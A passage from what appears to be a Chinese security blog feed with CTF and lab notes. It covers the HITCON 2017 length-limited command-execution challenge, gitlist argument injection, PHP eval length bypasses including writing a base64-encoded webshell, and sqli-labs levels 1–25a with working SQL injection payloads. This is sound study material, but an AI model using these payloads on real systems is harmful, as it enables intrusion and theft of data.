</span><br><span class="line"></span><br><span class="line">    <span class="comment"># exec</span></span><br><span class="line">    <span class="string">'sh _'</span>, </span><br><span class="line">    <span class="string">'sh g'</span>, </span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">'http://10.188.2.20:22460/?reset=1'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">assert</span> len(i) &lt;= <span class="number">5</span> </span><br><span class="line">    r = requests.get(<span class="string">'http://10.188.2.20:22460/?cmd='</span> + quote(i) )</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br></pre></td></tr></table></figure><p><a href="https://github.com/t3hp0rP/hitconDockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge" target="_blank" rel="noopener">Dockerfile</a></p><h2 id="绕过长度为4的限制"><a href="#绕过长度为4的限制" class="headerlink" title="绕过长度为4的限制"></a>绕过长度为4的限制</h2><p>。。太狠了</p><h2 id="绕过长度限制写shell"><a href="#绕过长度限制写shell" class="headerlink" title="绕过长度限制写shell"></a>绕过长度限制写shell</h2><p><img src= "/img/loading.gif" data-src="/posts/58281de6/1582540869115.png" alt></p><h2 id="参数注入"><a href="#参数注入" class="headerlink" title="参数注入"></a>参数注入</h2><p>gitlist远程命令执行漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">searchTree</span><span class="params">($query, $branch)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($query)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $query = escapeshellarg($query);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $results = <span class="keyword">$this</span>-&gt;getClient()-&gt;run(<span class="keyword">$this</span>, <span class="string">"grep -i --line-number &#123;$query&#125; $branch"</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (\RuntimeException $e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>复现：</p><p>这里的问题出在单引号并不能使得包裹的内容成为一个非选项</p><p><img src= "/img/loading.gif" data-src="/posts/58281de6/dd89dc70-2446-48e1-a728-5693d1fa868a.bbb0aaacef7d.png" alt></p><p>创建一个 <code>--name</code> 文件，但是无法直接用 cat进行读取，因为会被认为是一个选项，即使是用单引号包裹也不行</p><p>比如这个命令就不会执行，因为单引号包裹的内容放在 <code>-e</code> 选项的值中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git grep -i --line-number -e &#39;--open-files-in-pager&#x3D;id;&#39; master</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/58281de6/1582541083787.png" alt></p><p>必须是 <code>cat -- --name</code>, 从这个例子也能看出，单引号并不是区分一个字符串是“参数值”或“选项”的标准。</p><p>修复：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">searchTree</span><span class="params">($query, $branch)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($query)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $query = preg_replace(<span class="string">'/(--?[A-Za-z0-9\-]+)/'</span>, <span class="string">''</span>, $query);</span><br><span class="line">    $query = escapeshellarg($query);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $results = <span class="keyword">$this</span>-&gt;getClient()-&gt;run(<span class="keyword">$this</span>, <span class="string">"grep -i --line-number -- &#123;$query&#125; $branch"</span>); <span class="comment">//强制加入 -- 使得后面的成为参数的值</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (\RuntimeException $e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>python中存在的漏洞点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">query = <span class="string">'id'</span></span><br><span class="line">r = subprocess.run([<span class="string">'git'</span>, <span class="string">'grep'</span>, <span class="string">'-i'</span>, <span class="string">'--line-number'</span>, query, <span class="string">'master'</span>], cwd=<span class="string">'/tmp/vulhub'</span>)</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/58281de6/8296bbd4-40cd-481e-9147-6f11e80967d8.6b4cdb17a1b8.png" alt></p><h2 id="eval长度限制绕过-amp-amp-PHP5-6新特性"><a href="#eval长度限制绕过-amp-amp-PHP5-6新特性" class="headerlink" title="eval长度限制绕过 &amp;&amp; PHP5.6新特性"></a>eval长度限制绕过 &amp;&amp; PHP5.6新特性</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$param = $_REQUEST[<span class="string">'param'</span>];</span><br><span class="line"><span class="keyword">if</span>(strlen($param)&lt;<span class="number">17</span> &amp;&amp; stripos($param,<span class="string">'eval'</span>) === <span class="keyword">false</span> &amp;&amp; stripos($param,<span class="string">'assert'</span>) === <span class="keyword">false</span>) &#123;</span><br><span class="line">  <span class="keyword">eval</span>($param);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param&#x3D;&#96;$_GET[1]&#96;;&amp;1&#x3D;bash</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param&#x3D;exec($_GET[1]);</span><br></pre></td></tr></table></figure><h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>有的同学提到了远程文件，但正常文件包含<code>include $_GET[1];</code>，这个刚好17个字符，超了一位。</p><p>不过，其实<code>include$_GET[1];</code>也是可以运行的，中间的空格可以不要。</p><p>这也是一个思路，但限制就是需要开启远程文件包含，但这个选项默认是关闭的。</p><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param&#x3D;$_GET[a](N,a,8);&amp;a&#x3D;file_put_contents</span><br></pre></td></tr></table></figure><p>file_put_contents的第一个参数是文件名，我传入N。PHP会认为N是一个常量，但我之前并没有定义这个常量，于是PHP就会把它转换成字符串’N’；第二个参数是要写入的数据，a也被转换成字符串’a’；第三个参数是flag，当flag=8的时候内容会追加在文件末尾，而不是覆盖。</p><p>除了<code>file_put_contents</code>，<code>error_log</code>函数效果也类似。</p><p>但是file_put_contents第二个参数如果是符号，就会导致PHP出错，比如<code>param=$_GET[a](N,&lt;,8);&amp;a=file_put_contents</code>。但如果要写webshell的话，“&lt;”等符号又是必不可少的。</p><p>写shell的方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 每次写入一个字符：PD9waHAgZXZhbCgkX1BPU1RbOV0pOw</span><br><span class="line"># 最后包含</span><br><span class="line">param&#x3D;include$_GET[0];&amp;0&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-decode&#x2F;resource&#x3D;N</span><br></pre></td></tr></table></figure><h4 id="本地日志包含"><a href="#本地日志包含" class="headerlink" title="本地日志包含"></a>本地日志包含</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param&#x3D;include$_GET[a];&amp;a&#x3D;&#x2F;home&#x2F;u244201241&#x2F;.logs&#x2F;php_error.log</span><br></pre></td></tr></table></figure><h3 id="标准答案，利用变长参数执行"><a href="#标准答案，利用变长参数执行" class="headerlink" title="标准答案，利用变长参数执行"></a>标准答案，利用变长参数执行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;test.php?1[]&#x3D;test&amp;1[]&#x3D;var_dump($_SERVER);&amp;2&#x3D;assert HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8081</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 22</span><br><span class="line"></span><br><span class="line">param&#x3D;usort(...$_GET);</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/58281de6/1582707944277.png" alt></p><p><a href="https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html" target="_blank" rel="noopener">参考</a></p><p>一个坑</p><p>想请教下，为什么用标准答案的方法时，get参数必须用数字才能正常执行，换成比如？a[]=test&amp;a[]=phpinfo();&amp;b=assert时就会失败，不知可否解答下</p><p>只有数字索引数组才能作为变长参数数组。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-lab记录</title>
      <link href="/posts/70df97a2/"/>
      <url>/posts/70df97a2/</url>
      
        <content type="html"><![CDATA[<h2 id="第一关-GET-Error-based-Single-quotes"><a href="#第一关-GET-Error-based-Single-quotes" class="headerlink" title="第一关 GET Error based- Single quotes"></a>第一关 GET Error based- Single quotes</h2><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 3 -- +</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/70df97a2/1581060199563.png" alt></p><p>(火狐不知道为什么感觉有bug)</p><p>在确定回显的时候，要注意去查一个不存在的数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;Less-1&#x2F;?id&#x3D;888&#39; union select 1,2,3 --+</span><br></pre></td></tr></table></figure><h2 id="第二关-GET-Error-based-Intiger"><a href="#第二关-GET-Error-based-Intiger" class="headerlink" title="第二关 GET Error based-Intiger"></a>第二关 GET Error based-Intiger</h2><p>没有单引号保护</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;Less-2&#x2F;?id&#x3D;12312 union select 1,2,3 #</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/70df97a2/1581060927106.png" alt></p><h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><p>加了括号保护</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql="<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=(<span class="string">'$id'</span>) <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">";</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;Less-3&#x2F;?id&#x3D;22333&#39; ) union select 1,2,3 --+</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/70df97a2/1581061220464.png" alt></p><h2 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h2><p>双引号保护</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;Less-4&#x2F;?id&#x3D;1111&quot;) union select 1,2,3--+</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/70df97a2/1581061432798.png" alt></p><h2 id="第五关-Double-injection-Single-Quotes"><a href="#第五关-Double-injection-Single-Quotes" class="headerlink" title="第五关  Double injection-Single Quotes"></a>第五关  Double injection-Single Quotes</h2><p>这里理解一下报错注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*),(<span class="keyword">concat</span>(<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>),(<span class="keyword">select</span> <span class="keyword">version</span>())))x <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">group</span> <span class="keyword">by</span> x</span><br></pre></td></tr></table></figure><p><code>floor(rand(0)*2)</code> 产生的数据很有规律</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select floor(rand(0)*2) from users</span><br><span class="line">;</span><br><span class="line">+------------------+</span><br><span class="line">| floor(rand(0)*2) |</span><br><span class="line">+------------------+</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                0 |</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">+------------------+</span><br><span class="line">0110 1100</span><br></pre></td></tr></table></figure><p>再看 <code>group by</code></p><p>首先计算第一次 <code>group by</code> 后面的字段值，然后去查找有没有，没有就需要插入，插入的时候需要再计算一次</p><p><a href="https://blog.csdn.net/he_and/article/details/80455884" target="_blank" rel="noopener">参考</a></p><p>在第三次插入的时候出问题</p><p>最后的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;Less-5&#x2F;?id&#x3D;2&#39; and (select 1 from (select count(*),concat(((select group_concat(schema_name) from information_schema.schemata)),floor (rand(0)*2))x from information_schema.tables group by x)a) --+</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/70df97a2/1581062957254.png" alt></p><p>数据库也可以这样查</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select group_concat(schema_name) from information_schema.schemata;</span><br><span class="line">+<span class="comment">--------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line">| group_concat(schema_name)                                                                                                      |</span><br><span class="line">+<span class="comment">--------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line">| information_schema,challenges,ctf,dvwa,ed01,mysql,newdb,performance_schema,reservation,security,sys,test,tptest,typecho,xinxiu |</span><br><span class="line">+<span class="comment">--------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span></span><br></pre></td></tr></table></figure><p>简单一点的 payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and (select 1 from (select count(*),  concat((select database()), floor(rand(0)*2))x from information_schema.tables group by x )a) --+</span><br></pre></td></tr></table></figure><h2 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h2><p>同第五关类似</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;Less-6&#x2F;?id&#x3D;2&quot; and (select 1 from (select count(*), concat(floor(rand(0)*2), (select database()))x from information_schema.tables group by x)a) --+</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/70df97a2/1581063846151.png" alt></p><h2 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h2><p>是写shell，但是我没有成功(其实是因为mysql开了权限吧估计)</p><h2 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h2><p>布尔盲注(多加一些括号)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/Less-8/?id=1' and (<span class="keyword">select</span> <span class="keyword">ascii</span>(<span class="keyword">mid</span>((<span class="keyword">select</span> <span class="keyword">database</span>()), <span class="number">1</span>,<span class="number">1</span>)))=<span class="number">115</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/70df97a2/1581064726062.png" alt></p><h2 id="第九关-延时注入"><a href="#第九关-延时注入" class="headerlink" title="第九关 延时注入"></a>第九关 延时注入</h2><p>延时注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/Less-9/?id=1' and (<span class="keyword">select</span>  <span class="keyword">if</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">200</span> , <span class="keyword">sleep</span>(<span class="number">5</span>), <span class="literal">NULL</span>) ) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/70df97a2/1581065698494.png" alt></p><h2 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h2><p>延时注入，只是换成了双引号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/Less-10/?id=1" and (<span class="keyword">select</span> <span class="keyword">if</span>( <span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>)) &gt; <span class="number">40</span>, <span class="keyword">sleep</span>(<span class="number">5</span>), <span class="literal">NULL</span>)) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/70df97a2/1581065865089.png" alt></p><h2 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h2><p>POST形式的单引号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;&amp;passwd&#x3D;admin&#39; union select 1,2-- +&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/70df97a2/1581079686829.png" alt></p><h2 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h2><p>POST形式的双引号</p><p>payload(这次测试发现 <code>--+</code> 不行，需要换成 #)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;a&amp;passwd&#x3D;admin&quot;) union select 1,2# &amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/70df97a2/1581079951209.png" alt></p><h2 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h2><p>有报错回显，但是并没有其他的数据回显</p><p><img src= "/img/loading.gif" data-src="/posts/70df97a2/1581080112218.png" alt></p><p>payload(遇到困难加括号就行了)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;admin&#39;) and (select 1 from (select count(*), concat(floor(rand(0)*2),(select database()))x from information_schema.tables group by x)a)  #&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/70df97a2/1581080519639.png" alt></p><h2 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h2><p>同上一关类似</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;admin&quot; and (select 1 from (select count(*), concat(floor(rand(0)*2), (select database()))x  from information_schema.tables group by x)a)# &amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><h2 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a>第十五关</h2><p>延时注入,注意只能用 <code>#</code> 注释？</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=admin ' and (<span class="keyword">select</span>  <span class="keyword">if</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">30</span>, <span class="keyword">sleep</span>(<span class="number">5</span>), <span class="literal">NULL</span>) ) <span class="comment">#&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/70df97a2/1581081075376.png" alt="明显看到延时"></p><h2 id="第十六关"><a href="#第十六关" class="headerlink" title="第十六关"></a>第十六关</h2><p>同十五关</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;admin&quot;) and (select  if(ascii(substr(database(),1,1))&gt;30, sleep(5), NULL) ) #&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/70df97a2/1581081206257.png" alt></p><h2 id="第十七关-报错注入"><a href="#第十七关-报错注入" class="headerlink" title="第十七关 报错注入"></a>第十七关 报错注入</h2><p>update形式的注入，这里可以使用 报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;admin&#39;  and (updatexml(1,concat(0x3a,(select database())),1)) #&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/70df97a2/1581081624347.png" alt></p><h2 id="第十八关"><a href="#第十八关" class="headerlink" title="第十八关"></a>第十八关</h2><p>payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: 1' or updatexml(1,concat(0x3a,(database())),0),'','')<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/70df97a2/1581082594671.png" alt></p><h2 id="第十九关"><a href="#第十九关" class="headerlink" title="第十九关"></a>第十九关</h2><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer:  1&#39; or updatexml(1,concat(0x3a,(database())),0), &#39;&#39;)#</span><br></pre></td></tr></table></figure><p>INSERT 形式的注入</p><p><img src= "/img/loading.gif" data-src="/posts/70df97a2/1581083050547.png" alt></p><h2 id="第二十关"><a href="#第二十关" class="headerlink" title="第二十关"></a>第二十关</h2><p>cookie形式的报错注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' and (updatexml(1,concat(0x3a,(<span class="keyword">select</span> <span class="keyword">database</span>())),<span class="number">1</span>)) <span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/70df97a2/1581124084727.png" alt></p><h2 id="第二十一关"><a href="#第二十一关" class="headerlink" title="第二十一关"></a>第二十一关</h2><p>需要base64编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; ) and (updatexml(1, concat(0x3a, (select database()),0x3a ) ,1)) #</span><br></pre></td></tr></table></figure><p>编码之后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YWRtaW4nICkgYW5kICh1cGRhdGV4bWwoMSwgY29uY2F0KDB4M2EsIChzZWxlY3QgZGF0YWJhc2UoKSksMHgzYSApICwxKSkgIw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/70df97a2/1581124754782.png" alt></p><h2 id="第二十二关"><a href="#第二十二关" class="headerlink" title="第二十二关"></a>第二十二关</h2><p>改成了双引号闭合</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&quot; and (updatexml(1, concat(0x3a, (select database()),0x3a ) ,1)) #</span><br></pre></td></tr></table></figure><p>base64编码之后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YWRtaW4iIGFuZCAodXBkYXRleG1sKDEsIGNvbmNhdCgweDNhLCAoc2VsZWN0IGRhdGFiYXNlKCkpLDB4M2EgKSAsMSkpICM&#x3D;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/70df97a2/1581137685241.png" alt></p><h2 id="第二十三关"><a href="#第二十三关" class="headerlink" title="第二十三关"></a>第二十三关</h2><p>这一次把注释符过滤了</p><p><img src= "/img/loading.gif" data-src="/posts/70df97a2/1581137728016.png" alt></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$reg = <span class="string">"/#/"</span>;</span><br><span class="line">$reg1 = <span class="string">"/--/"</span>;</span><br><span class="line">$replace = <span class="string">""</span>;</span><br><span class="line">$id = preg_replace($reg, $replace, $id);</span><br><span class="line">$id = preg_replace($reg1, $replace, $id);</span><br></pre></td></tr></table></figure><p>报错注入可以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;Less-23&#x2F;?id&#x3D;1&#39; and (updatexml(1, concat(0x3a, (select database()),0x3a ) ,1)) and &#39;1&#39; &#x3D;&#39;1</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/70df97a2/1581137879879.png" alt></p><h2 id="第二十四关"><a href="#第二十四关" class="headerlink" title="第二十四关"></a>第二十四关</h2><p>二次注入，注册一个用户名 <code>admin &#39;#</code> 就可以修改admin的密码了</p><h2 id="第二十五关"><a href="#第二十五关" class="headerlink" title="第二十五关"></a>第二十五关</h2><p>过滤了 <code>and</code> 和 <code>or</code> ，</p><p>可以双写绕过或者使用 <code>&amp;&amp;</code> 和 <code>||</code></p><p><img src= "/img/loading.gif" data-src="/posts/70df97a2/1581138060996.png" alt></p><p><img src= "/img/loading.gif" data-src="/posts/70df97a2/1581138112434.png" alt></p><h2 id="25a"><a href="#25a" class="headerlink" title="25a"></a>25a</h2><p>类似的过滤了and和or，而且没有单引号保护，双写绕过</p><p><img src= "/img/loading.gif" data-src="/posts/70df97a2/1581139222272.png" alt></p><h2 id="第二十六关"><a href="#第二十六关" class="headerlink" title="第二十六关"></a>第二十六关</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS学习记录</title>
